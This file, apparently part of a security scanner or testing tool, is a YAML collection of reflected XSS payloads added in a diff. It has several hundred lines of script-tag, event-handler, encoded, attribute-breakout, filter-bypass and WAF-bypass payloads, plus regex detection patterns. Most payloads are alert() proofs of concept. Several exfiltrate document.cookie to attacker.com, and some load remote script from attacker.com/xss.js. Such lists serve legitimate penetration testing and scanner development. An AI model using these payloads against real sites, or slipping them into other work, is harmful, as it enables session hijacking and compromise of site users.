@@ -1,0 +1,764 @@
+metadata:
+  type: xss/reflected
+  version: "1.0"
+  description: "Reflected XSS payloads for various contexts"
+  sources: ["OWASP", "PortSwigger", "PayloadsAllTheThings", "BruteLogic"]
+
+detection_patterns:
+  - "<script[^>]*>.*?alert\\s*\\("
+  - "on\\w+\\s*=\\s*['\"]?alert"
+  - "javascript\\s*:\\s*alert"
+  - "alert\\s*\\(.*?\\)"
+
+payloads:
+  basic:
+    - value: "<script>alert(1)</script>"
+      description: "Basic script tag XSS"
+      severity: high
+      tags: [basic, script]
+
+    - value: "<script>alert('XSS')</script>"
+      description: "Script tag with string"
+      severity: high
+      tags: [basic, script]
+
+    - value: "<script>alert(document.cookie)</script>"
+      description: "Cookie theft via alert"
+      severity: high
+      tags: [basic, script, cookie]
+
+    - value: "<script>alert(String.fromCharCode(88,83,83))</script>"
+      description: "String.fromCharCode bypass"
+      severity: high
+      tags: [basic, script, encoding]
+
+    - value: "<script>alert`1`</script>"
+      description: "Template literal alert"
+      severity: high
+      tags: [basic, script, template_literal]
+
+    - value: "<script>alert(\\x31)</script>"
+      description: "Hex escape alert param"
+      severity: high
+      tags: [basic, script, hex]
+
+    - value: "<script>confirm(1)</script>"
+      description: "Confirm instead of alert"
+      severity: high
+      tags: [basic, script]
+
+    - value: "<script>prompt(1)</script>"
+      description: "Prompt instead of alert"
+      severity: high
+      tags: [basic, script]
+
+    - value: "<script>console.log('XSS')</script>"
+      description: "Console log test"
+      severity: medium
+      tags: [basic, script]
+
+    - value: "<script>document.location='http://attacker.com/?c='+document.cookie</script>"
+      description: "Cookie exfiltration"
+      severity: critical
+      tags: [basic, script, exfiltration]
+
+    - value: "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>"
+      description: "Image-based exfiltration"
+      severity: critical
+      tags: [basic, script, exfiltration]
+
+  event_handlers:
+    - value: "<img src=x onerror=alert(1)>"
+      description: "img onerror XSS"
+      severity: high
+      tags: [event_handler, img]
+
+    - value: "<img src=x onerror=alert('XSS')>"
+      description: "img onerror with string"
+      severity: high
+      tags: [event_handler, img]
+
+    - value: "<img src=x onerror=alert(document.cookie)>"
+      description: "img onerror cookie theft"
+      severity: high
+      tags: [event_handler, img, cookie]
+
+    - value: "<img src=x onerror=alert`1`>"
+      description: "img onerror template literal"
+      severity: high
+      tags: [event_handler, img, template_literal]
+
+    - value: "<svg onload=alert(1)>"
+      description: "svg onload XSS"
+      severity: high
+      tags: [event_handler, svg]
+
+    - value: "<svg onload=alert('XSS')>"
+      description: "svg onload with string"
+      severity: high
+      tags: [event_handler, svg]
+
+    - value: "<svg/onload=alert(1)>"
+      description: "svg no space onload"
+      severity: high
+      tags: [event_handler, svg]
+
+    - value: "<body onload=alert(1)>"
+      description: "body onload XSS"
+      severity: high
+      tags: [event_handler, body]
+
+    - value: "<input onfocus=alert(1) autofocus>"
+      description: "input onfocus autofocus"
+      severity: high
+      tags: [event_handler, input]
+
+    - value: "<input onblur=alert(1) autofocus><input autofocus>"
+      description: "input onblur autofocus"
+      severity: high
+      tags: [event_handler, input]
+
+    - value: "<select onfocus=alert(1) autofocus>"
+      description: "select onfocus"
+      severity: high
+      tags: [event_handler, select]
+
+    - value: "<textarea onfocus=alert(1) autofocus>"
+      description: "textarea onfocus"
+      severity: high
+      tags: [event_handler, textarea]
+
+    - value: "<keygen onfocus=alert(1) autofocus>"
+      description: "keygen onfocus"
+      severity: high
+      tags: [event_handler, keygen]
+
+    - value: "<video onerror=alert(1)><source>"
+      description: "video onerror"
+      severity: high
+      tags: [event_handler, video]
+
+    - value: "<video onloadstart=alert(1)><source>"
+      description: "video onloadstart"
+      severity: high
+      tags: [event_handler, video]
+
+    - value: "<audio onerror=alert(1)><source>"
+      description: "audio onerror"
+      severity: high
+      tags: [event_handler, audio]
+
+    - value: "<audio onloadstart=alert(1)><source>"
+      description: "audio onloadstart"
+      severity: high
+      tags: [event_handler, audio]
+
+    - value: "<details open ontoggle=alert(1)>"
+      description: "details ontoggle"
+      severity: high
+      tags: [event_handler, details]
+
+    - value: "<details ontoggle=alert(1) open>"
+      description: "details ontoggle variant"
+      severity: high
+      tags: [event_handler, details]
+
+    - value: "<marquee onstart=alert(1)>"
+      description: "marquee onstart"
+      severity: high
+      tags: [event_handler, marquee]
+
+    - value: "<marquee onfinish=alert(1)>"
+      description: "marquee onfinish"
+      severity: high
+      tags: [event_handler, marquee]
+
+    - value: "<object data=javascript:alert(1)>"
+      description: "object data javascript"
+      severity: high
+      tags: [event_handler, object]
+
+    - value: "<iframe onload=alert(1)>"
+      description: "iframe onload"
+      severity: high
+      tags: [event_handler, iframe]
+
+    - value: "<iframe src=javascript:alert(1)>"
+      description: "iframe javascript src"
+      severity: high
+      tags: [event_handler, iframe]
+
+    - value: "<embed src=javascript:alert(1)>"
+      description: "embed javascript src"
+      severity: high
+      tags: [event_handler, embed]
+
+    - value: "<div onmouseover=alert(1)>hover me</div>"
+      description: "div onmouseover"
+      severity: high
+      tags: [event_handler, div]
+
+    - value: "<div onmouseenter=alert(1)>hover me</div>"
+      description: "div onmouseenter"
+      severity: high
+      tags: [event_handler, div]
+
+    - value: "<a onmouseover=alert(1)>hover</a>"
+      description: "anchor onmouseover"
+      severity: high
+      tags: [event_handler, anchor]
+
+    - value: "<a onclick=alert(1)>click me</a>"
+      description: "anchor onclick"
+      severity: high
+      tags: [event_handler, anchor]
+
+    - value: "<button onclick=alert(1)>click</button>"
+      description: "button onclick"
+      severity: high
+      tags: [event_handler, button]
+
+    - value: "<form onsubmit=alert(1)><input type=submit></form>"
+      description: "form onsubmit"
+      severity: high
+      tags: [event_handler, form]
+
+    - value: "<isindex action=javascript:alert(1) type=image>"
+      description: "isindex action"
+      severity: high
+      tags: [event_handler, isindex]
+
+    - value: "<style onreadystatechange=alert(1)>"
+      description: "style onreadystatechange"
+      severity: high
+      tags: [event_handler, style]
+
+    - value: "<table bgcolor=javascript:alert(1)>"
+      description: "table bgcolor"
+      severity: high
+      tags: [event_handler, table]
+
+    - value: "<a href=javascript:alert(1)>click</a>"
+      description: "anchor javascript href"
+      severity: high
+      tags: [event_handler, anchor, javascript_uri]
+
+    - value: "<a href=\"javascript:alert(1)\">click</a>"
+      description: "anchor javascript href quoted"
+      severity: high
+      tags: [event_handler, anchor, javascript_uri]
+
+    - value: "<a href='javascript:alert(1)'>click</a>"
+      description: "anchor javascript href single quote"
+      severity: high
+      tags: [event_handler, anchor, javascript_uri]
+
+    - value: "<a href=javascript&colon;alert(1)>click</a>"
+      description: "colon entity bypass"
+      severity: high
+      tags: [event_handler, anchor, javascript_uri]
+
+    - value: "<a href=\"java&#x73;cript:alert(1)\">click</a>"
+      description: "hex entity in javascript"
+      severity: high
+      tags: [event_handler, anchor, javascript_uri]
+
+  html5:
+    - value: "<details open ontoggle=alert(1)>"
+      description: "HTML5 details ontoggle"
+      severity: high
+      tags: [html5, details]
+
+    - value: "<marquee onstart=alert(1)>"
+      description: "HTML5 marquee onstart"
+      severity: high
+      tags: [html5, marquee]
+
+    - value: "<marquee onfinish=alert(1)>"
+      description: "HTML5 marquee onfinish"
+      severity: high
+      tags: [html5, marquee]
+
+    - value: "<meter onmouseover=alert(1)>0</meter>"
+      description: "HTML5 meter onmouseover"
+      severity: high
+      tags: [html5, meter]
+
+    - value: "<progress onmouseover=alert(1)>0</progress>"
+      description: "HTML5 progress onmouseover"
+      severity: high
+      tags: [html5, progress]
+
+    - value: "<output onmouseover=alert(1)>0</output>"
+      description: "HTML5 output onmouseover"
+      severity: high
+      tags: [html5, output]
+
+    - value: "<source onerror=alert(1)>"
+      description: "HTML5 source onerror"
+      severity: high
+      tags: [html5, source]
+
+    - value: "<picture><source onerror=alert(1)><img></picture>"
+      description: "HTML5 picture source"
+      severity: high
+      tags: [html5, picture]
+
+    - value: "<dialog open onclose=alert(1)><button autofocus onfocus=alert(1)>click</button></dialog>"
+      description: "HTML5 dialog"
+      severity: high
+      tags: [html5, dialog]
+
+    - value: "<slot onfocus=alert(1) tabindex=1>"
+      description: "HTML5 slot"
+      severity: high
+      tags: [html5, slot]
+
+    - value: "<template><img src=x onerror=alert(1)></template>"
+      description: "HTML5 template"
+      severity: high
+      tags: [html5, template]
+
+    - value: "<canvas id=c onfocus=alert(1) tabindex=1>"
+      description: "HTML5 canvas"
+      severity: high
+      tags: [html5, canvas]
+
+    - value: "<datalist id=d onfocus=alert(1) autofocus><option>a</datalist>"
+      description: "HTML5 datalist"
+      severity: high
+      tags: [html5, datalist]
+
+  encoded:
+    - value: "&lt;script&gt;alert(1)&lt;/script&gt;"
+      description: "HTML entity encoded script"
+      severity: high
+      tags: [encoded, html_entity]
+
+    - value: "&#60;script&#62;alert(1)&#60;/script&#62;"
+      description: "Decimal entity encoded"
+      severity: high
+      tags: [encoded, html_entity]
+
+    - value: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
+      description: "Hex entity encoded"
+      severity: high
+      tags: [encoded, html_entity]
+
+    - value: "%3Cscript%3Ealert(1)%3C/script%3E"
+      description: "URL encoded script"
+      severity: high
+      tags: [encoded, url]
+
+    - value: "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
+      description: "Double URL encoded"
+      severity: high
+      tags: [encoded, double_url]
+
+    - value: "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E"
+      description: "Hex escape encoded"
+      severity: high
+      tags: [encoded, hex_escape]
+
+    - value: "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E"
+      description: "Unicode escape encoded"
+      severity: high
+      tags: [encoded, unicode]
+
+    - value: "javascript:alert(1)"
+      description: "Javascript URI"
+      severity: high
+      tags: [encoded, javascript_uri]
+
+    - value: "javascript:alert('XSS')"
+      description: "Javascript URI with string"
+      severity: high
+      tags: [encoded, javascript_uri]
+
+    - value: "javascript:alert`1`"
+      description: "Javascript URI template literal"
+      severity: high
+      tags: [encoded, javascript_uri, template_literal]
+
+    - value: "data:text/html,<script>alert(1)</script>"
+      description: "Data URI XSS"
+      severity: high
+      tags: [encoded, data_uri]
+
+    - value: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+      description: "Base64 data URI XSS"
+      severity: high
+      tags: [encoded, data_uri, base64]
+
+    - value: "data:text/html;charset=utf-8,<script>alert(1)</script>"
+      description: "Data URI with charset"
+      severity: high
+      tags: [encoded, data_uri]
+
+    - value: "jaVasCript:alert(1)"
+      description: "Mixed case javascript URI"
+      severity: high
+      tags: [encoded, javascript_uri, case]
+
+    - value: "jav&#x61;script:alert(1)"
+      description: "Entity in javascript URI"
+      severity: high
+      tags: [encoded, javascript_uri, entity]
+
+    - value: "java\\0script:alert(1)"
+      description: "Null byte in javascript URI"
+      severity: high
+      tags: [encoded, javascript_uri, null_byte]
+
+  attribute_breaking:
+    - value: "\"><script>alert(1)</script>"
+      description: "Double quote break out"
+      severity: high
+      tags: [attribute, breakout]
+
+    - value: "'><script>alert(1)</script>"
+      description: "Single quote break out"
+      severity: high
+      tags: [attribute, breakout]
+
+    - value: "\"><img src=x onerror=alert(1)>"
+      description: "Double quote img break out"
+      severity: high
+      tags: [attribute, breakout, img]
+
+    - value: "'><img src=x onerror=alert(1)>"
+      description: "Single quote img break out"
+      severity: high
+      tags: [attribute, breakout, img]
+
+    - value: "\" onmouseover=\"alert(1)"
+      description: "Double quote attribute injection"
+      severity: high
+      tags: [attribute, injection]
+
+    - value: "' onmouseover='alert(1)"
+      description: "Single quote attribute injection"
+      severity: high
+      tags: [attribute, injection]
+
+    - value: "\" onfocus=\"alert(1)\" autofocus=\""
+      description: "Double quote onfocus"
+      severity: high
+      tags: [attribute, injection]
+
+    - value: "' onfocus='alert(1)' autofocus='"
+      description: "Single quote onfocus"
+      severity: high
+      tags: [attribute, injection]
+
+    - value: "\" onclick=\"alert(1)"
+      description: "Double quote onclick"
+      severity: high
+      tags: [attribute, injection]
+
+    - value: "'-alert(1)-'"
+      description: "Single quote JS expression"
+      severity: high
+      tags: [attribute, expression]
+
+    - value: "\"-alert(1)-\""
+      description: "Double quote JS expression"
+      severity: high
+      tags: [attribute, expression]
+
+    - value: "'-alert(1)//"
+      description: "Single quote with comment"
+      severity: high
+      tags: [attribute, expression]
+
+    - value: "\";alert(1);//"
+      description: "Semicolon injection"
+      severity: high
+      tags: [attribute, expression]
+
+    - value: "';alert(1);//"
+      description: "Single quote semicolon"
+      severity: high
+      tags: [attribute, expression]
+
+    - value: "\";alert(1);//"
+      description: "Double quote semicolon"
+      severity: high
+      tags: [attribute, expression]
+
+    - value: "/><script>alert(1)</script>"
+      description: "Self-closing tag breakout"
+      severity: high
+      tags: [attribute, breakout]
+
+    - value: "\" onmouseover=alert(1) x=\""
+      description: "Attribute injection with x"
+      severity: high
+      tags: [attribute, injection]
+
+    - value: "' onmouseover=alert(1) x='"
+      description: "Single quote attribute x"
+      severity: high
+      tags: [attribute, injection]
+
+    - value: "onmouseover=alert(1)"
+      description: "No quote attribute injection"
+      severity: high
+      tags: [attribute, injection]
+
+    - value: "\" onmouseover=alert(1) \""
+      description: "Space separated attribute"
+      severity: high
+      tags: [attribute, injection]
+
+  filter_bypass:
+    - value: "<scr<script>ipt>alert(1)</scr</script>ipt>"
+      description: "Nested script tag bypass"
+      severity: high
+      tags: [filter_bypass, nested]
+
+    - value: "<SCRIPT>alert(1)</SCRIPT>"
+      description: "Uppercase script tag"
+      severity: high
+      tags: [filter_bypass, case]
+
+    - value: "<ScRiPt>alert(1)</ScRiPt>"
+      description: "Mixed case script tag"
+      severity: high
+      tags: [filter_bypass, case]
+
+    - value: "<script/src=//attacker.com/xss.js>"
+      description: "Remote script via /"
+      severity: high
+      tags: [filter_bypass, remote_script]
+
+    - value: "<script src=//attacker.com/xss.js></script>"
+      description: "Remote script protocol-relative"
+      severity: high
+      tags: [filter_bypass, remote_script]
+
+    - value: "<script src=http://attacker.com/xss.js></script>"
+      description: "Remote script HTTP"
+      severity: high
+      tags: [filter_bypass, remote_script]
+
+    - value: "<scr\x00ipt>alert(1)</script>"
+      description: "Null byte in script tag"
+      severity: high
+      tags: [filter_bypass, null_byte]
+
+    - value: "<script>\\u0061lert(1)</script>"
+      description: "Unicode escape in JS"
+      severity: high
+      tags: [filter_bypass, unicode]
+
+    - value: "<script>eval(atob('YWxlcnQoMSk='))</script>"
+      description: "Base64 eval bypass"
+      severity: high
+      tags: [filter_bypass, base64]
+
+    - value: "<script>eval(unescape('%61%6C%65%72%74%28%31%29'))</script>"
+      description: "Unescape eval bypass"
+      severity: high
+      tags: [filter_bypass, unescape]
+
+    - value: "<script>setTimeout('alert(1)',0)</script>"
+      description: "setTimeout bypass"
+      severity: high
+      tags: [filter_bypass, setTimeout]
+
+    - value: "<script>setInterval('alert(1)',0)</script>"
+      description: "setInterval bypass"
+      severity: high
+      tags: [filter_bypass, setInterval]
+
+    - value: "<script>Function('alert(1)')()</script>"
+      description: "Function constructor"
+      severity: high
+      tags: [filter_bypass, function]
+
+    - value: "<script>[].constructor.constructor('alert(1)')()</script>"
+      description: "Constructor chain bypass"
+      severity: high
+      tags: [filter_bypass, constructor]
+
+    - value: "<script>top['al'+'ert'](1)</script>"
+      description: "String concatenation bypass"
+      severity: high
+      tags: [filter_bypass, concatenation]
+
+    - value: "<script>window['al'+'ert'](1)</script>"
+      description: "Window concatenation"
+      severity: high
+      tags: [filter_bypass, concatenation]
+
+    - value: "<script>self['al'+'ert'](1)</script>"
+      description: "Self concatenation"
+      severity: high
+      tags: [filter_bypass, concatenation]
+
+    - value: "<script>alert&lpar;1&rpar;</script>"
+      description: "HTML entity parentheses"
+      severity: high
+      tags: [filter_bypass, entity]
+
+    - value: "<script>alert&#40;1&#41;</script>"
+      description: "Decimal entity parentheses"
+      severity: high
+      tags: [filter_bypass, entity]
+
+    - value: "<script>alert&#x28;1&#x29;</script>"
+      description: "Hex entity parentheses"
+      severity: high
+      tags: [filter_bypass, entity]
+
+    - value: "<script>(alert)(1)</script>"
+      description: "Wrapped alert call"
+      severity: high
+      tags: [filter_bypass, wrapper]
+
+    - value: "<script>a=alert;a(1)</script>"
+      description: "Variable assignment bypass"
+      severity: high
+      tags: [filter_bypass, variable]
+
+    - value: "<script>~alert(1)</script>"
+      description: "Bitwise NOT prefix"
+      severity: high
+      tags: [filter_bypass, operator]
+
+    - value: "<script>+alert(1)</script>"
+      description: "Unary plus prefix"
+      severity: high
+      tags: [filter_bypass, operator]
+
+    - value: "<script>alert(1)//"
+      description: "Unclosed script with comment"
+      severity: high
+      tags: [filter_bypass, unclosed]
+
+  waf_bypass:
+    - value: "<img src=x onerror=alert`1`>"
+      description: "Template literal alert WAF bypass"
+      severity: high
+      tags: [waf_bypass, template_literal]
+
+    - value: "eval(atob('YWxlcnQoMSk='))"
+      description: "eval+atob WAF bypass"
+      severity: high
+      tags: [waf_bypass, base64]
+
+    - value: "<svg/onload=alert(1)>"
+      description: "No space svg onload"
+      severity: high
+      tags: [waf_bypass, svg]
+
+    - value: "<svg onload%09=alert(1)>"
+      description: "Tab in attribute"
+      severity: high
+      tags: [waf_bypass, whitespace]
+
+    - value: "<svg onload%0a=alert(1)>"
+      description: "Newline in attribute"
+      severity: high
+      tags: [waf_bypass, whitespace]
+
+    - value: "<svg onload%0d=alert(1)>"
+      description: "CR in attribute"
+      severity: high
+      tags: [waf_bypass, whitespace]
+
+    - value: "<svg onload =alert(1)>"
+      description: "Extra space before equals"
+      severity: high
+      tags: [waf_bypass, whitespace]
+
+    - value: "<img src=x onerror=alert(1)//"
+      description: "Comment to close tag"
+      severity: high
+      tags: [waf_bypass, comment]
+
+    - value: "<img src=x onerror=alert(1)>"
+      description: "Standard img WAF test"
+      severity: high
+      tags: [waf_bypass, img]
+
+    - value: "<img dynsrc=javascript:alert(1)>"
+      description: "dynsrc attribute"
+      severity: high
+      tags: [waf_bypass, obscure]
+
+    - value: "<img lowsrc=javascript:alert(1)>"
+      description: "lowsrc attribute"
+      severity: high
+      tags: [waf_bypass, obscure]
+
+    - value: "<input type=image src=javascript:alert(1)>"
+      description: "input type=image"
+      severity: high
+      tags: [waf_bypass, input]
+
+    - value: "<form action=javascript:alert(1)><input type=submit></form>"
+      description: "form action javascript"
+      severity: high
+      tags: [waf_bypass, form]
+
+    - value: "<isindex action=javascript:alert(1) type=image>"
+      description: "isindex action"
+      severity: high
+      tags: [waf_bypass, isindex]
+
+    - value: "<table background=javascript:alert(1)>"
+      description: "table background"
+      severity: high
+      tags: [waf_bypass, table]
+
+    - value: "<td background=javascript:alert(1)>"
+      description: "td background"
+      severity: high
+      tags: [waf_bypass, td]
+
+    - value: "<div style=\"width:expression(alert(1))\">"
+      description: "CSS expression (IE)"
+      severity: high
+      tags: [waf_bypass, css_expression]
+
+    - value: "<div style=\"background:url(javascript:alert(1))\">"
+      description: "CSS background url"
+      severity: high
+      tags: [waf_bypass, css]
+
+    - value: "<xss id=x tabindex=1 onfocus=alert(1)></xss>"
+      description: "Custom tag XSS"
+      severity: high
+      tags: [waf_bypass, custom_tag]
+
+    - value: "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
+      description: "MathML XSS"
+      severity: high
+      tags: [waf_bypass, mathml]
+
+    - value: "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">"
+      description: "MathML xlink"
+      severity: high
+      tags: [waf_bypass, mathml]
+
+    - value: "<foreignObject><body onload=alert(1)></foreignObject>"
+      description: "SVG foreignObject"
+      severity: high
+      tags: [waf_bypass, svg]
+
+    - value: "<svg><a><rect width=99% height=99% /><animate attributeName=href to=javascript:alert(1)>"
+      description: "SVG animate href"
+      severity: high
+      tags: [waf_bypass, svg, animate]
+
+    - value: "<svg><set attributeName=onload to=alert(1)>"
+      description: "SVG set attributeName"
+      severity: high
+      tags: [waf_bypass, svg, set]
+
+    - value: "<svg><use href=\"data:image/svg+xml,<svg id=x onload=alert(1)></svg>\">"
+      description: "SVG use href data"
+      severity: high
+      tags: [waf_bypass, svg, use]
